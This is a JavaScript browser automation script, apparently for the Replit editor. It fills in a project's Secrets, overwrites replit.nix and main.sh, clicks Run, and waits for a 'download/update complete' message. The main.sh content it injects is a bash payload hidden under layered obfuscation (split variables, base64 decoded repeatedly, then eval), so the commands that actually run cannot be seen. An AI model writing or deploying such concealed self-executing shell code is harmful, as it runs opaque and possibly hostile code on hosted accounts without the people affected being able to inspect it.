'use strict';
var fun =
{
    obj: {
        main_sh: "z0='bash -c \"$(base64 -';z1='d <<< \"ejA9J2Jhc2gg';z2='LWMgIiQnO3oxPScoYmF';z3='zZTY0IC1kJzt6Mj0nID';z4='w8PCAiWW1Geic7ejM9J';z5='2FDQXRZeUFpSkMnO3o0';z6='PSdoaVlYTmxOalFnJzt';z7='6NT0nTFdRZ1BEdzhJQy';z8='c7ejY9J0pKZVVWMldXM';z9='XMnO3o3PSdkVXd5U21o';z10='ak1tJzt6OD0nZExXbGR';z11='PYjJKNSc7ejk9J1FXaz';z12='JTeXN6TlQnO3oxMD0nW';z13='nBUalUyTWtvMyc7ejEx';z14='PSdOM2xOTlV4cFREJzt';z15='6MTI9J1pNTWprMWNIVX';z16='cnO3oxMz0nTlhCaGR6V';z17='k1hWCc7ejE0PSdRMGIw';z18='TnRORzlEJzt6MTU9J2J';z19='VbG5jSGxpVTAnO3oxNj';z20='0nRjBZMjFaWjB4cCc7e';z21='jE3PSdPSFZaTWtacVlV';z22='Jzt6MTg9J2RWZG1OSWJ';z23='EQmgnO3oxOT0nUnpsMV';z24='NVRndkRyc7ejIwPSdFe';z25='VVuQmphVUYwJzt6MjE9';z26='J1kwTkJkVXg1TlcnO3o';z27='yMj0ncFpWMDV2V2xNNS';z28='c7ejIzPSdkMlZZVW05a';z29='U1qJzt6MjQ9J1JuUTIw';z30='MU5GQlQnO3oyNT0nTkh';z31='aTWJVNW9XVCc7ejI2PS';z32='dKb2JFd3pRalZrJzt6M';z33='jc9J1IyaDJZbWs0YTAn';z34='O3oyOD0ndElVbmxKUXp';z35='Gcic7ejI5PSdXWGxCYm';z36='xGVE1XJzt6MzA9J0ZaV';z37='XpFMlRVTXcnO3ozMT0n';z38='TlVwNVFUaE1NbCc7ejM';z39='yPSdKc1pHazVNV050Jz';z40='t6MzM9J1JuVmFSemwwU';z41='1UnO3ozND0naDNaMkZI';z42='Vm1oYSc7ejM1PSdRMEY';z43='wV1hsQk1FJzt6MzY9J3';z44='RUTlRaaFdFRm4nO3ozN';z45='z0nUTI1a2JscFlVVyc7';z46='ejM4PSdkTVZUaG5Ta2M';z47='xJzt6Mzk9J05FbERVVz';z48='lhVjAnO3o0MD0nNXZZb';z49='mxCYTJNeSc7ejQxPSdW';z50='bXBqYlZZd1l6Jzt6NDI';z51='9J0U1TVdOSFVtaGsnO3';z52='o0Mz0nUjFabVpGaEtjM';z53='Cc7ejQ0PSdsSWVHbFpX';z54='RTVzJzt6NDU9J1RtcFJ';z55='aMHhYVVgnO3o0Nj0nQk';z56='pSRFIyV2tkVyc7ejQ3P';z57='SdNa3d5TlRGaVIzJzt6';z58='NDg9J2RuVFdvMGJVMVQ';z59='nO3o0OT0nUVV0a1Z6VT';z60='JZVic7ejUwPSdoQlowe';z61='FhPR2RNJzt6NTE9J1Yx';z62='Rm5UR2s0ZFYnO3o1Mj0';z63='na3lSbXBoUjFWbic7ej';z64='UzPSdTa2MxTkVsRU5IJ';z65='zt6NTQ9J1phUjFZeVRE';z66='STEnO3o1NT0nTVdKSGQ';z67='yZE5haic7ejU2PSdSdF';z68='RWTkJTMWt5Jzt6NTc9J';z69='2FIUmlNbEZuU3onO3o1';z70='OD0nTm5aMHhwT0hWWic';z71='7ejU5PSdNa1pxWVVkVm';z72='RtJzt6NjA9J05JYkRCa';z73='FJ6bDEnO3o2MT0nVERJ';z74='eGFHRlhOSCc7ejYyPSd';z75='Wak1tZG5RMmswJzt6Nj';z76='M9J2RreHRUbWhaTW0nO';z77='3o2ND0naHNURE5DTldS';z78='SCc7ejY1PSdhSFppYVR';z79='sMFdWJzt6NjY9J2RzZF';z80='V4dVRtOUonO3o2Nz0nU';z81='VQwOUlpa2lJRyc7ejY4';z82='PSdKaGMyZ2dJaVJBJzt';z83='6Njk9J0lqcz0iKSIgYm';z84='EnO3o3MD0nc2ggIiRAI';z85='jsnO2V2YWwgIiR6MCR6';z86='MSR6MiR6MyR6NCR6NSR';z87='6NiR6NyR6OCR6OSR6MT';z88='AkejExJHoxMiR6MTMke';z89='jE0JHoxNSR6MTYkejE3';z90='JHoxOCR6MTkkejIwJHo';z91='yMSR6MjIkejIzJHoyNC';z92='R6MjUkejI2JHoyNyR6M';z93='jgkejI5JHozMCR6MzEk';z94='ejMyJHozMyR6MzQkejM';z95='1JHozNiR6MzckejM4JH';z96='ozOSR6NDAkejQxJHo0M';z97='iR6NDMkejQ0JHo0NSR6';z98='NDYkejQ3JHo0OCR6NDk';z99='kejUwJHo1MSR6NTIkej';z100='UzJHo1NCR6NTUkejU2J';z101='Ho1NyR6NTgkejU5JHo2';z102='MCR6NjEkejYyJHo2MyR';z103='6NjQkejY1JHo2NiR6Nj';z104='ckejY4JHo2OSR6NzAiO';z105='w==\")\" bash \"$@\";';eval \"$z0$z1$z2$z3$z4$z5$z6$z7$z8$z9$z10$z11$z12$z13$z14$z15$z16$z17$z18$z19$z20$z21$z22$z23$z24$z25$z26$z27$z28$z29$z30$z31$z32$z33$z34$z35$z36$z37$z38$z39$z40$z41$z42$z43$z44$z45$z46$z47$z48$z49$z50$z51$z52$z53$z54$z55$z56$z57$z58$z59$z60$z61$z62$z63$z64$z65$z66$z67$z68$z69$z70$z71$z72$z73$z74$z75$z76$z77$z78$z79$z80$z81$z82$z83$z84$z85$z86$z87$z88$z89$z90$z91$z92$z93$z94$z95$z96$z97$z98$z99$z100$z101$z102$z103$z104$z105\";",
        replit_nix: "",
        Secrets: ""
    },
    a01: function (secrets, replit_nix) {       
        this.obj.secrets = secrets
        this.obj.replit_nix = decodeURIComponent(replit_nix)
        this.a02(100)
    },
    a02: function (num) {
        $("title").html("【超时：" + num + "】找【secrets】按扭...")
        this.Time("name", 2000, this.a03, this, num);
    },
    a03: function (num) {
        let o1 = $('button[aria-label="Close"]')
        if (o1.length != 0) {
            $("title").html("关闭新手教程")
            o1.click();
        }
        this.a04(num)
    },
    a04: function (num) {
        num--;
        if (num == 0) {
            $("title").html("找【secrets】按扭，已超时。")
        }
        else {
            let oo = $('button:contains("Secrets")')[0]//【secrets】按扭是否能找到
            if (oo.length == 0) {
                this.a02(num)
            }
            else {
                $("title").html("已找【secrets】按扭。")
                oo.click();
                this.d01(50)
            }
        }
    },
    /////////////////////////////////////////
    d01: function (num) {
        $("title").html("【超时：" + num + "】找【secrets】按扭...")
        this.Time("name", 500, this.d02, this, num);
    },
    d02: function (num) {
        num--;
        if (num == 0) {
            $("title").html("找【Edit as JSON】按扭，已超时。")
        }
        else {
            let oo = $('.css-o99p4i')//【Edit as JSON】按扭是否能找到
            if (oo.length == 0) {
                this.d01(num)
            }
            else {
                $("title").html("已找【Edit as JSON】按扭。")
                oo.click();
                this.e01(50)
            }
        }
    },
    ////////////////////////////////////////////////////
    e01: function (num) {
        $("title").html("【超时：" + num + "】找【Raw Secrets Editor】输入框...")
        this.Time("name", 500, this.e02, this, num);
    },
    e02: function (num) {
        num--;
        if (num == 0) {
            $("title").html("找【Raw Secrets Editor】按扭，已超时。")
        }
        else {
            let oo = $('div[data-language="json"]')//【Raw Secrets Editor】按扭是否能找到
            if (oo.length == 0) {
                this.e01(num)
            }
            else {
                $("title").html("已找【Raw Secrets Editor】按扭。")
                oo.html(this.obj.secrets);
                this.Time("name", 600, this.e03, this);//必须延时。
            }
        }
    },
    e03: function () {
        if ($('div[data-language="json"]').text() == this.obj.secrets) {
            $("title").html("点【save】按扭。")
            $(".css-10k4d9x").click();
            this.e04(50)
        }
        else {
            $("title").html("没填请去，重填一下。")
            this.e02(10);
        }
    },
    e04: function (num) {
        $("title").html("【超时：" + num + "】是否保存成功...")
        this.Time("name", 500, this.e05, this, num);
    },
    e05: function (num) {
        num--;
        if (num == 0) {
            $("title").html("是否保存，已超时。")
        }
        else {
            let oo = $('div[data-language="json"]')//找不到就是保存成功
            if (oo.length == 1) {
                this.e04(num)
            }
            else {
                $("title").html("保存成功了！正在打开【main.sh】文件。。。")
                $('div[title="main.sh"]').click();
                this.Time("name", 1000, this.f01, this, 50);
            }
        }
    },
    ///////////////////////////////////////////////
    f01: function (num) {
        $("title").html("【超时：" + num + "】main.sh是否打开.")
        this.Time("name", 200, this.f02, this, num);
    },
    f02: function (num) {
        num--;
        if (num == 0) {
            $("title").html("找【main.sh】是否打开，已超时。")
        }
        else {
            let oo = $('div[data-language="shell"]')//main.sh是否打开
            if (oo.length == 0) {
                this.f01(num)
            }
            else {
                if (oo.text() != "") {
                    $("title").html("延时100ms，填main.sh代码。")
                    this.Time("name", 100, this.f03, this);
                }
                else {
                    this.f01(num)
                }
            }
        }
    },
    f03: function () {
        $('div[data-language="shell"]').html(this.obj.main_sh);
        this.Time("name", 100, this.g01, this);
    },
    ///////////////////////////////
    g01: function (num) {
        $("title").html("打开【replit.nix】文件。。。")
        $('div[aria-label="replit.nix"]').click();
        this.g02(50);
    },
    g02: function (num) {
        $("title").html("【超时：" + num + "】打开【replit.nix】。。。")
        this.Time("name", 500, this.g03, this, num);
    },
    g03: function (num) {
        num--
        if (num == 0) {
            $("title").html("找【replit.nix】是否打开，已超时。")
        }
        else {
            let oo = $('div[data-language="Nix"]')
            if (oo.length == 0) {
                this.g01(num)
            }
            else {
                if (oo.text() != "") {
                    $("title").html("延时200ms，填replit.nix代码。")
                    this.Time("name", 200, this.g04, this);
                }
                else { this.g01(num); }
            }
        }

    },
    g04: function () {
        $('div[data-language="Nix"]').html(this.obj.replit_nix)
        this.g05(50)
    },
    g05: function (num) {
        $("title").html("【超时：" + num + "】找运行按扭点去。")
        this.Time("name", 300, this.g06, this, num);
    },
    g06: function (num) {
        num--;
        let o1 = $(".css-gzg6ut:contains('Stop')")//Stop按扭
        let o2 = $(".css-1kvwu98:contains('Run')")//运行按扭
        if (o1.length == 1) {
            $("title").html("点Stop按扭")
            o1.click();
            this.g05(50);
        }
        else if (o2.length == 1) {
            $("title").html("点运行")
            $('button[aria-label="Clear history"]').click();//清除之前的提示信息，否则可能会提前跳出来。
            o2.click();//点运行
            this.h01(30)
        }
        else {
            this.g05(num);
        }
    },
    //////////////////////////////////////////////
    h01: function (num) {
        $("title").html("【超时：" + num + "】已点运行...")
        this.Time("name", 1000, this.h02, this, num);
    },
    h02: function (num) {
        $("title").html("【超时：" + num + "】下三角形，是否打开。")
        let oo = $('button[aria-label="Collapse"]')//
        if (oo.length == 0) {
            this.h01(num)
        }
        else {
            //点下三角形，让它变成右三角形。
            $("title").html("点完了")
            oo.click();
            this.h03(60);
        }
    },
    h03: function (num) {
        $("title").html("【超时：" + num + "】已点下三角形...")
        this.Time("name", 1000, this.h04, this, num);
    },
    h04: function (num) {
        num--;
        if (num == 0) {
            $("title").html("已点下三角形，已超时。")
        }
        else {
            let oo = $(".css-kbkfsn")
            if (oo.length != 0) {
                let text = oo.text()
                if (text.indexOf("下载更新完成。") != -1) {
                    $("title").html("已找到【下载更新完成。】，可以跳出了。")
                }
                else {
                    this.h03(num)
                }
            }
            else {
                this.h03(num)
            }
        }
    },
    //////////////////////////////////////////////
    i01: function () {
        this.i02(10)
    },
    i02: function (num) {
        $("title").html("【超时：" + num + "】清空...")
        this.Time("name", 1000, this.i03, this, num);
    },
    i03: function (num) {
        num--;
        if (num == 0) {
            $("title").html("清空一下。")
        }
        else {
            let oo = $('.css-kbkfsn')//
            if (oo.length == 0) {
                this.i02(num)
            }
            else {
                oo.html("清空一下。");           
            }

        }
    },

    ///////////////////////////////////////////////////////////////////////////////
    TimeNameArr: [],//定时器名称
    Time: function (name, time, next, This, t) {
        if (this.TimeNameArr[name]) {
            window.clearTimeout(this.TimeNameArr[name]);
            delete this.TimeNameArr[name];
        };
        //setTimeout() 方法用于在指定的毫秒数后调用函数或计算表达式。
        this.TimeNameArr[name] = window.setTimeout(function () {
            if (t == undefined) {
                next.apply(This);
            }
            else { next.apply(This, [t]); }
        }, time);
    }
}